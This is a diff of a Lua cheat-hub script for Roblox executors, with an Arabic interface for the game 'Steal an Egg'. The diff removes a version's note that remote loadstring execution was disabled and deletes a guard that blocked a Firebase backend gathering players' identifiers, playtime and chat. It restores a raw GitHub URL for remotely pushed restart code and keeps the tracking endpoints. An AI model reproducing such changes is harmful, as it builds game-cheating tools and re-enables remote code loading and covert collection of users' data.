@@ -1,761 +1,5 @@
--- VERSION: 11V | REXEL + BEN FEATURES INTEGRATION
--- REXEL main design preserved; Ben feature suite remains accessible from the REXEL ✦ control.
--- REXEL UI preserved; imported feature suite is opened with the ✦ button.
--- Remote loadstring execution has been disabled for safety.
-
---[[
-    VERSION: 11V | REXEL + BEN HUB FEATURE INTEGRATION
-    CHANGELOG:
-      8V: Automatically downloads the exact Top4Top image to executor storage,
-          converts it with getcustomasset/getsynasset, and displays it.
-      7V: Previous interface layout and fallback background.
-
-    REXEL | STEAL AN EGG UI
-    Arabic Roblox interface based on the supplied reference.
-
-    IMPORTANT:
-      - The direct Top4Top URL is loaded automatically only in executors that
-        provide request + writefile + getcustomasset (or getsynasset).
-      - A normal Roblox Studio LocalScript cannot download a web JPG and turn
-        it into an ImageLabel asset. Studio requires a Roblox image asset ID.
-      - If the executor blocks Top4Top or lacks those APIs, the interface
-        remains usable and shows the built-in background.
-]]
-
--- VERSION: 10V
-local BACKGROUND_URL = "https://d.top4top.io/p_3956imcxl0.jpg"
-local BACKGROUND_FILE = "REXEL_BACKGROUND_8V.jpg"
-
--- Executor-only web-image loader. Returns a custom local asset URI on success.
-local function loadRemoteBackground()
-    local env = _G
-    pcall(function()
-        if type(getgenv) == "function" then
-            env = getgenv()
-        elseif type(getfenv) == "function" then
-            env = getfenv()
-        end
-    end)
-
-    local requestFn = env.request or env.http_request or env.httpRequest
-    if not requestFn and type(env.syn) == "table" then
-        requestFn = env.syn.request
-    end
-    if not requestFn and type(env.http) == "table" then
-        requestFn = env.http.request
-    end
-
-    local writeFn = env.writefile
-    local assetFn = env.getcustomasset or env.getsynasset
-    local isFileFn = env.isfile
-
-    if type(writeFn) ~= "function" or type(assetFn) ~= "function" then
-        return nil, "المنفّذ لا يدعم getcustomasset و writefile"
-    end
-
-    -- Use a previously downloaded copy when available.
-    if type(isFileFn) == "function" then
-        local okExists, exists = pcall(isFileFn, BACKGROUND_FILE)
-        if okExists and exists then
-            local okCached, cachedUri = pcall(assetFn, BACKGROUND_FILE)
-            if okCached and type(cachedUri) == "string" then
-                return cachedUri
-            end
-        end
-    end
-
-    local body
-    if type(requestFn) == "function" then
-        local okRequest, response = pcall(function()
-            return requestFn({
-                Url = BACKGROUND_URL,
-                Method = "GET"
-            })
-        end)
-
-        if okRequest and type(response) == "table" then
-            local statusCode = tonumber(response.StatusCode or response.Status or 200)
-            if statusCode and statusCode ~= 200 then
-                return nil, "رابط الصورة أعاد حالة HTTP " .. tostring(statusCode)
-            end
-            body = response.Body or response.body
-        end
-    end
-
-    -- Some executors expose game:HttpGet even when request() is unavailable.
-    if type(body) ~= "string" and game.HttpGet then
-        local okGet, responseBody = pcall(function()
-            return game:HttpGet(BACKGROUND_URL)
-        end)
-        if okGet then body = responseBody end
-    end
-
-    if type(body) ~= "string" or #body < 1000 then
-        return nil, "تعذر تنزيل الصورة من الرابط"
-    end
-
-    local okWrite = pcall(function()
-        writeFn(BACKGROUND_FILE, body)
-    end)
-    if not okWrite then
-        return nil, "تعذر حفظ الصورة في ملفات المنفّذ"
-    end
-
-    local okAsset, assetUri = pcall(function()
-        return assetFn(BACKGROUND_FILE)
-    end)
-    if not okAsset or type(assetUri) ~= "string" then
-        return nil, "تعذر تحويل الصورة إلى أصل محلي"
-    end
-
-    return assetUri
-end
-
-
-
-
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- The image will be loaded from BACKGROUND_URL automatically where supported.
-
-local old = playerGui:FindFirstChild("RixelStealEgg")
-if old then old:Destroy() end
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "RixelStealEgg"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.DisplayOrder = 50
-gui.Parent = playerGui
-
-local C = {
-    black = Color3.fromRGB(12, 11, 15),
-    black2 = Color3.fromRGB(18, 16, 21),
-    panel = Color3.fromRGB(25, 21, 26),
-    panel2 = Color3.fromRGB(34, 27, 31),
-    panel3 = Color3.fromRGB(48, 34, 38),
-    red = Color3.fromRGB(220, 73, 78),
-    redBright = Color3.fromRGB(255, 103, 108),
-    redDark = Color3.fromRGB(103, 37, 43),
-    cream = Color3.fromRGB(250, 231, 202),
-    cream2 = Color3.fromRGB(224, 204, 181),
-    white = Color3.fromRGB(247, 243, 239),
-    muted = Color3.fromRGB(175, 159, 157),
-    green = Color3.fromRGB(80, 218, 151),
-    gold = Color3.fromRGB(247, 194, 105),
-}
-
-local function make(className, props, parent)
-    local obj = Instance.new(className)
-    for k, v in pairs(props) do
-        obj[k] = v
-    end
-    obj.Parent = parent
-    return obj
-end
-
-local function corner(obj, px)
-    make("UICorner", {CornerRadius = UDim.new(0, px)}, obj)
-end
-
-local function stroke(obj, color, transparency, thickness)
-    return make("UIStroke", {
-        Color = color,
-        Transparency = transparency or 0,
-        Thickness = thickness or 1,
-        ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    }, obj)
-end
-
-local function gradient(obj, color1, color2, rotation)
-    make("UIGradient", {
-        Color = ColorSequence.new(color1, color2),
-        Rotation = rotation or 0
-    }, obj)
-end
-
-local function tween(obj, seconds, props)
-    TweenService:Create(
-        obj,
-        TweenInfo.new(seconds, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
-        props
-    ):Play()
-end
-
-local function label(parent, text, size, position, textSize, color, font, align, z)
-    return make("TextLabel", {
-        BackgroundTransparency = 1,
-        Text = text,
-        Size = size,
-        Position = position,
-        TextColor3 = color or C.white,
-        Font = font or Enum.Font.Gotham,
-        TextSize = textSize or 12,
-        TextXAlignment = align or Enum.TextXAlignment.Left,
-        TextYAlignment = Enum.TextYAlignment.Center,
-        TextWrapped = true,
-        ZIndex = z or 5
-    }, parent)
-end
-
--- Responsive sizing: leave a safe margin so the window never clips off-screen.
-local uiScale = make("UIScale", {Scale = 1}, gui)
-local camera = workspace.CurrentCamera
-local function updateScale()
-    camera = workspace.CurrentCamera
-    local viewport = camera and camera.ViewportSize or Vector2.new(900, 650)
-    local fitX = math.max(1, viewport.X - 24) / 700
-    local fitY = math.max(1, viewport.Y - 24) / 440
-    uiScale.Scale = math.clamp(math.min(fitX, fitY), 0.42, 1)
-end
-updateScale()
-if camera then camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale) end
-
--- Main window.
-local main = make("Frame", {
-    Name = "RixelWindow",
-    AnchorPoint = Vector2.new(0.5, 0.5),
-    Position = UDim2.fromScale(0.5, 0.5),
-    Size = UDim2.fromOffset(700, 440),
-    BackgroundColor3 = C.black,
-    BorderSizePixel = 0,
-    ClipsDescendants = true
-}, gui)
-corner(main, 14)
-stroke(main, C.red, 0.28, 1.4)
-
--- Background fallback, so the UI looks finished even without an image ID.
-local bgBase = make("Frame", {
-    Name = "BackgroundBase",
-    Position = UDim2.fromOffset(116, 44),
-    Size = UDim2.new(1, -116, 1, -44),
-    BackgroundColor3 = Color3.fromRGB(106, 46, 48),
-    BorderSizePixel = 0,
-    ClipsDescendants = true,
-    ZIndex = 1
-}, main)
-gradient(bgBase, Color3.fromRGB(173, 91, 75), Color3.fromRGB(49, 24, 31), 28)
-
--- Decorative soft shapes behind the image.
-for i = 1, 7 do
-    local stripe = make("Frame", {
-        Position = UDim2.new((i - 1) * 0.16, -30, 0, -55),
-        Size = UDim2.new(0, 78, 1, 115),
-        Rotation = 18,
-        BackgroundColor3 = (i % 2 == 0) and C.cream or C.redBright,
-        BackgroundTransparency = 0.91,
-        BorderSizePixel = 0,
-        ZIndex = 1
-    }, bgBase)
-end
-
-local bgImage = make("ImageLabel", {
-    Name = "SuppliedAnimeBackground",
-    Position = UDim2.fromScale(0, 0),
-    Size = UDim2.fromScale(1, 1),
-    BackgroundTransparency = 1,
-    Image = "",
-    ImageTransparency = 0.05,
-    ScaleType = Enum.ScaleType.Crop,
-    BorderSizePixel = 0,
-    Visible = false,
-    ZIndex = 2
-}, bgBase)
-
--- Soft tint keeps Arabic text readable while leaving the artwork visible.
-local bgTint = make("Frame", {
-    Size = UDim2.fromScale(1, 1),
-    BackgroundColor3 = Color3.fromRGB(24, 10, 18),
-    BackgroundTransparency = 0.47,
-    BorderSizePixel = 0,
-    ZIndex = 3
-}, bgBase)
-
--- Header.
-local header = make("Frame", {
-    Size = UDim2.new(1, 0, 0, 44),
-    BackgroundColor3 = Color3.fromRGB(9, 8, 12),
-    BorderSizePixel = 0,
-    ZIndex = 10
-}, main)
-
-local logo = make("Frame", {
-    Position = UDim2.fromOffset(10, 7),
-    Size = UDim2.fromOffset(29, 29),
-    BackgroundColor3 = C.red,
-    BorderSizePixel = 0,
-    ZIndex = 11
-}, header)
-corner(logo, 8)
-label(logo, "R", UDim2.fromScale(1, 1), UDim2.fromScale(0, 0), 20, C.white, Enum.Font.GothamBlack, Enum.TextXAlignment.Center, 12)
-
-label(header, "ريكسل | REXEL", UDim2.fromOffset(130, 20), UDim2.fromOffset(46, 3), 12, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 11)
-label(header, "STEAL AN EGG  •  HUB", UDim2.fromOffset(140, 12), UDim2.fromOffset(47, 23), 7, C.muted, Enum.Font.Gotham, Enum.TextXAlignment.Left, 11)
-
--- Compact stat pills, similar to the reference.
-local function pill(x, width, iconText, valueText, accentColor)
-    local p = make("Frame", {
-        Position = UDim2.fromOffset(x, 10),
-        Size = UDim2.fromOffset(width, 28),
-        BackgroundColor3 = C.panel,
-        BackgroundTransparency = 0.08,
-        BorderSizePixel = 0,
-        ZIndex = 11
-    }, header)
-    corner(p, 8)
-    stroke(p, accentColor, 0.78, 1)
-    label(p, iconText, UDim2.fromOffset(18, 24), UDim2.fromOffset(6, 1), 11, accentColor, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 12)
-    label(p, valueText, UDim2.new(1, -29, 1, 0), UDim2.fromOffset(25, 0), 9, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 12)
-    return p
-end
-
-pill(190, 62, "◷", "00:18", C.cream)
-pill(258, 72, "◆", "0 مسروق", C.redBright)
-pill(336, 62, "✦", "325", C.gold)
-pill(404, 65, "●", "13", C.green)
-
-local search = make("TextBox", {
-    Position = UDim2.new(1, -184, 0, 8),
-    Size = UDim2.fromOffset(92, 28),
-    BackgroundColor3 = C.panel,
-    BorderSizePixel = 0,
-    PlaceholderText = "بحث...",
-    PlaceholderColor3 = C.muted,
-    Text = "",
-    TextColor3 = C.white,
-    Font = Enum.Font.Gotham,
-    TextSize = 10,
-    ClearTextOnFocus = false,
-    ZIndex = 12
-}, header)
-corner(search, 8)
-stroke(search, C.panel3, 0.2, 1)
-
--- REXEL 11V: opens the integrated Ben feature suite from the REXEL interface.
-local advancedButton = make("TextButton", {
-    Name = "AdvancedFeaturesButton",
-    Position = UDim2.new(1, -226, 0, 8),
-    Size = UDim2.fromOffset(34, 28),
-    BackgroundColor3 = C.redDark,
-    Text = "✦",
-    TextColor3 = C.cream,
-    Font = Enum.Font.GothamBlack,
-    TextSize = 14,
-    BorderSizePixel = 0,
-    ZIndex = 12
-}, header)
-corner(advancedButton, 7)
-stroke(advancedButton, C.redBright, 0.35, 1)
-advancedButton.MouseButton1Click:Connect(function()
-    if type(_G.REXEL_OpenAdvanced) == "function" then
-        _G.REXEL_OpenAdvanced()
-        notice.Text = "تم فتح مركز الوظائف المتقدمة"
-        notice.TextColor3 = C.green
-    else
-        notice.Text = "مركز الوظائف المتقدمة لم يجهز بعد"
-        notice.TextColor3 = C.gold
-    end
-end)
-
-local minimize = make("TextButton", {
-    Position = UDim2.new(1, -79, 0, 8),
-    Size = UDim2.fromOffset(26, 28),
-    BackgroundColor3 = C.panel2,
-    Text = "—",
-    TextColor3 = C.white,
-    Font = Enum.Font.GothamBold,
-    TextSize = 15,
-    BorderSizePixel = 0,
-    ZIndex = 12
-}, header)
-corner(minimize, 7)
-
-local close = make("TextButton", {
-    Position = UDim2.new(1, -43, 0, 8),
-    Size = UDim2.fromOffset(26, 28),
-    BackgroundColor3 = C.redDark,
-    Text = "×",
-    TextColor3 = C.redBright,
-    Font = Enum.Font.GothamBold,
-    TextSize = 19,
-    BorderSizePixel = 0,
-    ZIndex = 12
-}, header)
-corner(close, 7)
-close.MouseButton1Click:Connect(function()
-    if type(_G.REXEL_CloseAdvanced) == "function" then
-        pcall(_G.REXEL_CloseAdvanced)
-    end
-    gui:Destroy()
-end)
-
--- Sidebar.
-local sidebar = make("Frame", {
-    Position = UDim2.fromOffset(0, 44),
-    Size = UDim2.new(0, 116, 1, -44),
-    BackgroundColor3 = Color3.fromRGB(10, 9, 13),
-    BorderSizePixel = 0,
-    ZIndex = 8
-}, main)
-
-label(sidebar, "القائمة الرئيسية", UDim2.new(1, -20, 0, 18), UDim2.fromOffset(10, 12), 9, C.muted, Enum.Font.GothamBold, Enum.TextXAlignment.Right, 9)
-
-local navHolder = make("Frame", {
-    Position = UDim2.fromOffset(7, 37),
-    Size = UDim2.new(1, -14, 1, -96),
-    BackgroundTransparency = 1,
-    ZIndex = 9
-}, sidebar)
-make("UIListLayout", {
-    Padding = UDim.new(0, 4),
-    SortOrder = Enum.SortOrder.LayoutOrder
-}, navHolder)
-
-local profile = make("Frame", {
-    Position = UDim2.new(0, 7, 1, -51),
-    Size = UDim2.new(1, -14, 0, 40),
-    BackgroundColor3 = C.panel,
-    BorderSizePixel = 0,
-    ZIndex = 9
-}, sidebar)
-corner(profile, 8)
-label(profile, player.DisplayName, UDim2.new(1, -14, 0, 16), UDim2.fromOffset(7, 5), 9, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Right, 10)
-label(profile, "ريكسل • لاعب", UDim2.new(1, -14, 0, 13), UDim2.fromOffset(7, 22), 8, C.muted, Enum.Font.Gotham, Enum.TextXAlignment.Right, 10)
-
--- Main content.
-local content = make("Frame", {
-    Position = UDim2.fromOffset(128, 54),
-    Size = UDim2.new(1, -140, 1, -64),
-    BackgroundTransparency = 1,
-    ZIndex = 5
-}, main)
-
-local pageTitle = label(content, "الأحداث", UDim2.new(1, -12, 0, 28), UDim2.fromOffset(6, 1), 17, C.white, Enum.Font.GothamBlack, Enum.TextXAlignment.Right, 6)
-local pageSubtitle = label(content, "تابع الفعاليات والخيارات المتاحة", UDim2.new(1, -12, 0, 18), UDim2.fromOffset(6, 29), 9, C.cream2, Enum.Font.Gotham, Enum.TextXAlignment.Right, 6)
-
-local sectionBar = make("Frame", {
-    Position = UDim2.fromOffset(5, 51),
-    Size = UDim2.new(1, -10, 0, 30),
-    BackgroundColor3 = C.black2,
-    BackgroundTransparency = 0.16,
-    BorderSizePixel = 0,
-    ZIndex = 6
-}, content)
-corner(sectionBar, 8)
-label(sectionBar, "الفعاليات والأنظمة", UDim2.new(1, -18, 1, 0), UDim2.fromOffset(9, 0), 10, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Right, 7)
-
-local list = make("ScrollingFrame", {
-    Name = "ItemsList",
-    Position = UDim2.fromOffset(5, 88),
-    Size = UDim2.new(1, -10, 1, -123),
-    BackgroundColor3 = C.black2,
-    BackgroundTransparency = 0.21,
-    BorderSizePixel = 0,
-    ScrollBarThickness = 3,
-    ScrollBarImageColor3 = C.red,
-    CanvasSize = UDim2.new(0, 0, 0, 0),
-    AutomaticCanvasSize = Enum.AutomaticSize.Y,
-    ZIndex = 6
-}, content)
-corner(list, 9)
-make("UIPadding", {
-    PaddingTop = UDim.new(0, 7),
-    PaddingBottom = UDim.new(0, 7),
-    PaddingLeft = UDim.new(0, 7),
-    PaddingRight = UDim.new(0, 7)
-}, list)
-local listLayout = make("UIListLayout", {
-    Padding = UDim.new(0, 5),
-    SortOrder = Enum.SortOrder.LayoutOrder
-}, list)
-
-local notice = label(content, "REXEL 10V • جاري تحميل الخلفية الأصلية...", UDim2.new(1, -12, 0, 22), UDim2.new(0, 6, 1, -25), 9, C.gold, Enum.Font.GothamBold, Enum.TextXAlignment.Right, 6)
-
--- Download and show the exact image from the user's link.
-task.spawn(function()
-    local assetUri, loadError = loadRemoteBackground()
-    if assetUri and gui.Parent then
-        bgImage.Image = assetUri
-        bgImage.Visible = true
-        notice.Text = "REXEL 10V • تم تحميل خلفيتك الأصلية"
-        notice.TextColor3 = C.green
-    elseif gui.Parent then
-        notice.Text = "الخلفية الأصلية تحتاج منفّذاً يدعم تحميل الصور"
-        notice.TextColor3 = C.gold
-        warn("[REXEL 11V] " .. tostring(loadError))
-    end
-end)
-
-local items = {
-    { "🥚", "التقاط البيضة", "Capture The Egg", "متاح", C.gold },
-    { "🏃", "الحركة", "Movement", "إعدادات", C.cream },
-    { "💍", "حدث الخاتم", "Ring Event", "حدث", C.gold },
-    { "🧚", "حدث الويزب", "Wisp Event", "حدث", C.violet or C.redBright },
-    { "🦋", "زهرة الفراشة", "Butterfly Bloom", "حدث", C.green },
-    { "🎃", "سباق الهالوين", "The Hollow Race", "موسمي", C.redBright },
-    { "⭐", "الشهاب", "Shooting Star", "حدث", C.cream },
-    { "🌾", "المزرعة", "Farm", "إعدادات", C.green },
-}
-
-local allRows = {}
-
-local function clearRows()
-    for _, child in ipairs(list:GetChildren()) do
-        if child:IsA("Frame") then child:Destroy() end
-    end
-    table.clear(allRows)
-end
-
-local function showItems(data)
-    clearRows()
-    for index, item in ipairs(data) do
-        local row = make("Frame", {
-            LayoutOrder = index,
-            Size = UDim2.new(1, -2, 0, 43),
-            BackgroundColor3 = C.panel,
-            BackgroundTransparency = 0.08,
-            BorderSizePixel = 0,
-            ZIndex = 7
-        }, list)
-        corner(row, 8)
-        local accent = make("Frame", {
-            Position = UDim2.new(1, -3, 0.18, 0),
-            Size = UDim2.new(0, 3, 0.64, 0),
-            BackgroundColor3 = item[5],
-            BorderSizePixel = 0,
-            ZIndex = 8
-        }, row)
-        corner(accent, 4)
-
-        label(row, item[1], UDim2.fromOffset(33, 34), UDim2.fromOffset(8, 7), 19, C.white, Enum.Font.Gotham, Enum.TextXAlignment.Center, 8)
-        label(row, item[2], UDim2.new(1, -132, 0, 19), UDim2.fromOffset(48, 5), 10, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 8)
-        label(row, item[3], UDim2.new(1, -132, 0, 15), UDim2.fromOffset(48, 24), 8, C.muted, Enum.Font.Gotham, Enum.TextXAlignment.Left, 8)
-
-        local tag = make("Frame", {
-            AnchorPoint = Vector2.new(1, 0.5),
-            Position = UDim2.new(1, -16, 0.5, 0),
-            Size = UDim2.fromOffset(52, 21),
-            BackgroundColor3 = C.panel3,
-            BorderSizePixel = 0,
-            ZIndex = 8
-        }, row)
-        corner(tag, 7)
-        label(tag, item[4], UDim2.fromScale(1, 1), UDim2.fromScale(0, 0), 8, item[5], Enum.Font.GothamBold, Enum.TextXAlignment.Center, 9)
-
-        local click = make("TextButton", {
-            Size = UDim2.fromScale(1, 1),
-            BackgroundTransparency = 1,
-            Text = "",
-            ZIndex = 10
-        }, row)
-        click.MouseButton1Click:Connect(function()
-            notice.Text = "تم اختيار: " .. item[2] .. "  •  اربط الوظيفة بنظام لعبتك"
-            notice.TextColor3 = item[5]
-            tween(row, 0.1, {BackgroundColor3 = C.panel3})
-            task.delay(0.18, function()
-                if row.Parent then tween(row, 0.16, {BackgroundColor3 = C.panel}) end
-            end)
-        end)
-        table.insert(allRows, {frame = row, item = item})
-    end
-end
-
-showItems(items)
-
--- Navigation pages.
-local pages = {
-    {"الرئيسية", "لوحة التحكم الرئيسية"},
-    {"سرقة", "أدوات وإعدادات قسم السرقة"},
-    {"البيوض", "قائمة البيوض ومعلوماتها"},
-    {"الحيوانات", "قائمة الحيوانات ومعلوماتها"},
-    {"الأحداث", "تابع الفعاليات والخيارات المتاحة"},
-    {"المزرعة", "معلومات وإعدادات المزرعة"},
-    {"الإعدادات", "خصص مظهر الواجهة"},
-}
-
-local selectedNav
-for index, page in ipairs(pages) do
-    local btn = make("TextButton", {
-        LayoutOrder = index,
-        Size = UDim2.new(1, 0, 0, 29),
-        BackgroundColor3 = C.panel,
-        BorderSizePixel = 0,
-        Text = page[1],
-        TextColor3 = C.cream,
-        Font = Enum.Font.GothamBold,
-        TextSize = 10,
-        ZIndex = 10
-    }, navHolder)
-    corner(btn, 7)
-
-    local marker = make("Frame", {
-        Position = UDim2.new(1, -3, 0.2, 0),
-        Size = UDim2.new(0, 3, 0.6, 0),
-        BackgroundColor3 = C.redBright,
-        BackgroundTransparency = 1,
-        BorderSizePixel = 0,
-        ZIndex = 11
-    }, btn)
-    corner(marker, 4)
-
-    btn.MouseButton1Click:Connect(function()
-        if selectedNav then
-            tween(selectedNav, 0.12, {BackgroundColor3 = C.panel})
-            local oldMarker = selectedNav:FindFirstChild("ActiveMarker")
-            if oldMarker then oldMarker.BackgroundTransparency = 1 end
-        end
-        selectedNav = btn
-        marker.Name = "ActiveMarker"
-        marker.BackgroundTransparency = 0
-        tween(btn, 0.12, {BackgroundColor3 = C.redDark})
-
-        pageTitle.Text = page[1]
-        pageSubtitle.Text = page[2]
-        notice.Text = "قسم " .. page[1] .. " مفتوح"
-        notice.TextColor3 = C.green
-
-        if page[1] == "الأحداث" or page[1] == "الرئيسية" then
-            showItems(items)
-            sectionBar.Visible = true
-        elseif page[1] == "الإعدادات" then
-            showItems({
-                {"🎨", "لون الواجهة", "Theme Color", "قريباً", C.redBright},
-                {"🖥", "حجم النافذة", "Window Size", "قريباً", C.gold},
-                {"✋", "تحريك الواجهة", "Drag Window", "مفعل", C.green},
-            })
-            sectionBar.Visible = true
-        elseif page[1] == "المزرعة" then
-            showItems({items[8]})
-            sectionBar.Visible = true
-        elseif page[1] == "البيوض" then
-            showItems({items[1]})
-            sectionBar.Visible = true
-        elseif page[1] == "الحيوانات" then
-            showItems({{"🐾", "الحيوانات", "Pets", "قائمة", C.green}})
-            sectionBar.Visible = true
-        else
-            showItems({
-                {"⚙", "إعدادات " .. page[1], "Options", "واجهة", C.gold},
-                {"✦", "معلومات القسم", "Section Info", "واجهة", C.redBright},
-            })
-            sectionBar.Visible = true
-        end
-    end)
-end
-
--- Search filters the current list by Arabic or English label.
-search:GetPropertyChangedSignal("Text"):Connect(function()
-    local query = string.lower(search.Text)
-    for _, entry in ipairs(allRows) do
-        local a = string.lower(entry.item[2])
-        local b = string.lower(entry.item[3])
-        entry.frame.Visible = query == "" or string.find(a, query, 1, true) ~= nil or string.find(b, query, 1, true) ~= nil
-    end
-end)
-
--- Minimize / restore.
-local minimized = false
-minimize.MouseButton1Click:Connect(function()
-    minimized = not minimized
-    sidebar.Visible = not minimized
-    content.Visible = not minimized
-    bgBase.Visible = not minimized
-    main.Size = minimized and UDim2.fromOffset(240, 44) or UDim2.fromOffset(700, 440)
-    minimize.Text = minimized and "+" or "—"
-end)
-
--- Drag by header (mouse and touch).
-local dragging = false
-local dragInput, dragStart, startPosition
-
-header.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-        or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPosition = main.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-header.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement
-        or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input == dragInput then
-        local delta = input.Position - dragStart
-        main.Position = UDim2.new(
-            startPosition.X.Scale, startPosition.X.Offset + delta.X,
-            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
-        )
-    end
-end)
-
--- Select Events by default.
-local defaultButton = navHolder:FindFirstChildWhichIsA("TextButton")
-if defaultButton then
-    defaultButton.BackgroundColor3 = C.redDark
-    local mark = defaultButton:FindFirstChildOfClass("Frame")
-    if mark then
-        mark.Name = "ActiveMarker"
-        mark.BackgroundTransparency = 0
-    end
-    selectedNav = defaultButton
-end
-
--- Early bridge: resolve GUI instances by name so the REXEL control remains usable
--- even if an optional Ben feature encounters an executor-specific runtime error.
-_G.REXEL_OpenAdvanced = function()
-    pcall(function()
-        local root = (type(gethui) == "function" and gethui()) or game:GetService("CoreGui")
-        local advanced = root:FindFirstChild("REXELAdvancedFeaturesUI")
-        if not advanced then advanced = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("REXELAdvancedFeaturesUI") end
-        if advanced then
-            advanced.Enabled = true
-            local frame = advanced:FindFirstChild("MainFrame")
-            if frame then frame.Visible = true end
-        end
-        local chat = root:FindFirstChild("REXELTopChatGui")
-        if chat then chat.Enabled = true end
-    end)
-end
-_G.REXEL_CloseAdvanced = function()
-    pcall(function()
-        local roots = {game:GetService("CoreGui")}
-        if type(gethui) == "function" then local ok, r = pcall(gethui); if ok and r then table.insert(roots, r) end end
-        local pg = game:GetService("Players").LocalPlayer:FindFirstChildOfClass("PlayerGui")
-        if pg then table.insert(roots, pg) end
-        for _, root in ipairs(roots) do
-            local advanced = root:FindFirstChild("REXELAdvancedFeaturesUI")
-            if advanced then
-                local frame = advanced:FindFirstChild("MainFrame")
-                if frame then frame.Visible = false end
-                advanced.Enabled = false
-            end
-            local chat = root:FindFirstChild("REXELTopChatGui")
-            if chat then chat.Enabled = false end
-        end
-    end)
-end
-
--- ================= INTEGRATED BEN FEATURE SUITE (11V) =================
-local __rexelAdvancedOk, __rexelAdvancedErr = pcall(function()
--- REXEL Hub - PS5 Neon Profile + Global Script User Leaderboards + Compact Stats (v64.1.0)
--- Developer: ريكسل
+-- KEON HUB - Anime Background / Landscape Layout (v70.0.0)
+-- Developer: كـيـون
 
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
@@ -766,26 +10,21 @@ local SoundService = game:GetService("SoundService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local LocalPlayer = Players.LocalPlayer
-local parent = nil
-if type(gethui) == "function" then
-    local ok, result = pcall(gethui)
-    if ok and typeof(result) == "Instance" then parent = result end
-end
-parent = parent or CoreGui:FindFirstChild("RobloxGui") or LocalPlayer:WaitForChild("PlayerGui")
+local parent = (gethui and gethui()) or CoreGui:FindFirstChild("RobloxGui") or LocalPlayer:WaitForChild("PlayerGui")
 
-if parent:FindFirstChild("REXELAdvancedFeaturesUI") then parent.REXELAdvancedFeaturesUI:Destroy() end
-if parent:FindFirstChild("REXELAdminBroadcastGui") then parent.REXELAdminBroadcastGui:Destroy() end
-if parent:FindFirstChild("REXELTopChatGui") then parent.REXELTopChatGui:Destroy() end
-if parent:FindFirstChild("REXELLoadingGui") then parent.REXELLoadingGui:Destroy() end
-if parent:FindFirstChild("REXELBanScreenGui") then parent.REXELBanScreenGui:Destroy() end
-if parent:FindFirstChild("REXELVoteBannerGui") then parent.REXELVoteBannerGui:Destroy() end
-if parent:FindFirstChild("REXELEventWidgetGui") then parent.REXELEventWidgetGui:Destroy() end
-if parent:FindFirstChild("REXELReloadWidgetGui") then parent.REXELReloadWidgetGui:Destroy() end
+if parent:FindFirstChild("KEONProV47UI") then parent.KEONProV47UI:Destroy() end
+if parent:FindFirstChild("KEONAdminBroadcastGui") then parent.KEONAdminBroadcastGui:Destroy() end
+if parent:FindFirstChild("KEONTopChatGui") then parent.KEONTopChatGui:Destroy() end
+if parent:FindFirstChild("KEONLoadingGui") then parent.KEONLoadingGui:Destroy() end
+if parent:FindFirstChild("KEONBanScreenGui") then parent.KEONBanScreenGui:Destroy() end
+if parent:FindFirstChild("KEONVoteBannerGui") then parent.KEONVoteBannerGui:Destroy() end
+if parent:FindFirstChild("KEONEventWidgetGui") then parent.KEONEventWidgetGui:Destroy() end
+if parent:FindFirstChild("KEONReloadWidgetGui") then parent.KEONReloadWidgetGui:Destroy() end
 
-local CONFIG_FILE = "REXEL_Config_v58.json"
+local CONFIG_FILE = "KEON_Config_v58.json"
 local DISCORD_WEBHOOK_URL = "" -- ضع Webhook جديداً بعد تدويره؛ لا تشارك رابطاً مكشوفاً
 
-local REXELProfile = {}
+local KEONProfile = {}
 local FIREBASE_BASE_URL = "https://arad-hun-default-rtdb.firebaseio.com"
 local FIREBASE_CHAT_URL = FIREBASE_BASE_URL .. "/global_chat.json"
 local FIREBASE_USERS_URL = FIREBASE_BASE_URL .. "/active_users.json"
@@ -795,20 +34,11 @@ local FIREBASE_ADMIN_ACTIONS_URL = FIREBASE_BASE_URL .. "/admin_actions.json"
 local FIREBASE_VOTE_BASE = FIREBASE_BASE_URL .. "/global_vote"
 local FIREBASE_VOTE_URL = FIREBASE_VOTE_BASE .. ".json"
 local FIREBASE_RELOAD_URL = FIREBASE_BASE_URL .. "/global_reload.json"
-REXELProfile.FIREBASE_USAGE_URL = FIREBASE_BASE_URL .. "/usage_stats.json"
+KEONProfile.FIREBASE_USAGE_URL = FIREBASE_BASE_URL .. "/usage_stats.json"
 
-local REXEL_RESTART_SCRIPT_URL = "" -- رابط RAW فارغ: لا يتم تنزيل أو تنفيذ كود خارجي تلقائياً -- رابط النسخة المعتمدة لإعادة التشغيل للجميع
+local KEON_RESTART_SCRIPT_URL = "https://raw.githubusercontent.com/ben5k/Ben-Hub/refs/heads/main/Ben%20Hub" -- رابط النسخة المعتمدة لإعادة التشغيل للجميع
 
 local function customRequest(options)
-    -- Privacy guard: the original Ben backend collects player identifiers, playtime,
-    -- chat and administrative state. Keep those network features disabled in this build.
-    local targetUrl = tostring(options and options.Url or "")
-    if string.find(string.lower(targetUrl), "arad-hun-default-rtdb.firebaseio.com", 1, true) then
-        return {StatusCode = 403, Body = "REXEL 11V: remote profile/chat backend disabled for privacy"}
-    end
